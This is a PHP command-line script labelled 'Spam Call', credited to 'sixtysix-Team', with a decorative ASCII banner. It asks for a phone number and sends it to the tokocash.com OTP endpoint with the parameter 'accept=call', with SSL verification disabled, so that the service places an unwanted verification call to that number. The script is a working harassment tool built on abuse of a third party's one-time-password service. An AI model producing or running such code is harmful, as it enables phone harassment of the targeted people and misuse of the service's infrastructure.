<?php

$banner ="\033[94m─────────▀▀▀▀▀▀\033[93m──────────▀▀▀▀▀▀▀
\033[94m──────▀▀▀▀▀▀▀▀▀▀▀▀▀\033[93m───▀▀▀▀▀▀▀▀▀▀▀▀▀
\033[94m────▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[93m──────────▀▀▀
\033[94m───▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[93m──────────────▀▀
\033[94m──▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[93m──────────────▀▀
\033[94m─▀▀▀▀▀▀▀▀▀▀▀▀───▀▀▀▀▀▀▀\033[93m───────────────▀▀
\033[94m─▀▀▀▀▀▀▀▀▀▀▀─────▀▀▀▀▀▀▀\033[93m──────────────▀▀
\033[94m─▀▀▀▀▀▀▀▀▀▀▀▀───▀▀▀▀▀▀▀▀\033[93m──────────────▀▀
\033[94m─▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[93m───────────────▀▀
\033[94m─▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[93m───────────────▀▀
\033[94m─▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[93m───────────────▀▀
\033[94m──▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[93m───────────────▀▀
\033[94m───▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[93m───────────────▀▀▀
\033[94m─────▀▀▀▀▀▀▀▀▀▀▀▀▀\033[93m───────────────▀▀▀
\033[94m──────▀▀▀▀▀▀▀▀▀▀▀\033[93m───▀▀▀────────▀▀▀
\033[94m────────▀▀▀▀▀▀▀▀▀\033[93m──▀▀▀▀▀────▀▀▀▀
\033[94m───────────▀▀▀▀▀▀\033[93m───▀▀▀───▀▀▀▀
\033[94m─────────────▀▀▀▀▀\033[93m─────▀▀▀▀
\033[94m────────────────▀▀▀\033[93m──▀▀▀▀
\033[94m──────────────────▀▀\033[93m▀▀
\033[94m───────────────────▀\033[93m▀

\033[91m[#] \033[93mSpam Call \033[91m[#]

\033[95mauthor : \033[91mBLANK (sixtysix-Team)
\033[95mgithub : \033[91mhttps://github.com/sixtysix-Team\n";

function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");
		$asw = curl_exec($ch);
        curl_close($ch);
        echo $asw."\n";
}

system('clear');
echo $banner;
echo "\n";
echo "\033[92mMasukkan Nomor\n\033[00mInput : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>